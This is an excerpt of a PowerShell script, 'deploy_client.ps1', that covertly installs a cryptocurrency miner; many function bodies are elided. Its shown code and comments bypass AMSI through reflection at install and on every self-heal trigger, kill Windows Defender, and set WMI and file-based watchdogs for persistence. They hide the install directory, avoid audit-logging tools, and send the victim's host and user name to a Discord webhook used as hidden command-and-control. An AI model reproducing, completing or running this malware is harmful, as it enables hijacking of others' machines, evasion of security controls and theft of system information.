# ================================================================
#  deploy_client.ps1 v7.5.2 — HARDENED EDITION (FIXED + RUNTIME AMSI)
#  Dual AMSI bypass, WMI event watchdog, in-memory execution
#  Stealth: no secedit, no powercfg, no explicit denies, obfuscated C2
#  Self-heal now includes runtime AMSI bypass on every trigger
# ================================================================
...
function Install-Miner {
    ...
    for ($attempt = 1; $attempt -le 3; $attempt++) {
        # Method 1: WebClient with randomized user agent
        try {
        ...
        # Method 2: Invoke-WebRequest with randomized IE UA
        if (-not $downloaded) {
            try {
        ...
        # Method 3: BITS transfer (low-noise, resume-capable)
        if (-not $downloaded) {
            try {
...
function Write-WmiWatchdog {
    ...
    # File-based backup watchdog (belt + suspenders) — no certutil, uses bitsadmin + WebClient
...
'@
    ...
    Write-Host "[+] File-based backup watchdog also active (no certutil)" -ForegroundColor Green
}

# ================================================================
#  SELF-HEAL SCRIPT — NOW WITH RUNTIME AMSI BYPASS
# ================================================================
...
# ============================================================
#  RUNTIME AMSI BYPASS — fires every time this script triggers
# ============================================================
try {
    $asm = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
    $type = $asm.GetType('System.Management.Automation.AmsiUtils')
...
'@
    ...
    Write-Host "[+] Self-heal script written (with runtime AMSI bypass)" -ForegroundColor Green
}
...
# ================================================================
#  Huge Pages via NtSetInformationProcess (no secedit audit trail)
# ================================================================
...
function Enable-HugePages {
    try {
        ...
        $privilege = [uint32]4  # SeLockMemoryPrivilege
        $ntdll::NtSetInformationProcess($handle, 29, [ref]$privilege, 4) | Out-Null
        Write-Host "[+] Huge Pages enabled (NtSetInformationProcess, no secedit)" -ForegroundColor Green
    } catch {
...
# ================================================================
#  Sleep disable via registry direct (no powercfg event log noise)
# ================================================================
...
function Disable-Sleep {
    ...
    Write-Host "[+] Sleep + hibernate disabled (registry direct, no powercfg)" -ForegroundColor Green
}
...
# ================================================================
#  Subtle directory locking (no explicit Admins deny)
# ================================================================
...
function Lock-InstallDirectory {
    ...
    & attrib +h +s "$installDir\*" /s /d 2>$null
    Write-Host "[+] Directory locked (SYSTEM + user only, no explicit deny)" -ForegroundColor Green
}
...
# ================================================================
#  Obfuscated Discord webhook (split + base64 decode at runtime)
# ================================================================
...
function Send-DiscordWebhook {
    ...
    $payload = @{username="SOINION";embeds=@(@{title="Miner Deployed (v7.5.2 RUNTIME AMSI)";color=$color;fields=@(@{name="Host";value="$env:COMPUTERNAME";inline=$true},@{name="User";value="$env:USERNAME";inline=$true},@{name="OS";value=$osName;inline=$false},@{name="Status";value=$statusField;inline=$false},@{name="Stealth";value="Dual AMSI bypass (deploy + self-heal), WMI watchdog, no certutil, no secedit, no powercfg, obfuscated C2";inline=$false});footer=@{text="deploy_client.ps1 v7.5.2"};timestamp=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")})} | ConvertTo-Json -Depth 5
    try {
...
$deploymentError = ""
try {
    Write-Host "`n[!] deploy_client.ps1 v7.5.2 — HARDENED EDITION (RUNTIME AMSI)" -ForegroundColor Cyan
    ...
    if ($minerProc) {
        ...
        Write-Host "[+] Dual AMSI bypass (deploy + runtime on self-heal)" -ForegroundColor Green
        Write-Host "[+] Defender killed (7 switches)" -ForegroundColor Green
        Write-Host "[+] All stealth fixes active (no secedit, no powercfg, no certutil, no explicit deny, obfuscated C2)" -ForegroundColor Green
    } else {
...
if ($deploymentSuccess) {
    try {
        ...
        Write-Host "[+] In-memory decode + AMSI bypass on every persistence trigger" -ForegroundColor Green
    } catch {
        Write-Host "[!] Self-encode failed (script stays on disk): $_" -ForegroundColor Yellow
    }
}

Write-Host "`n[!] Done. v7.5.2 deployed." -ForegroundColor Cyan
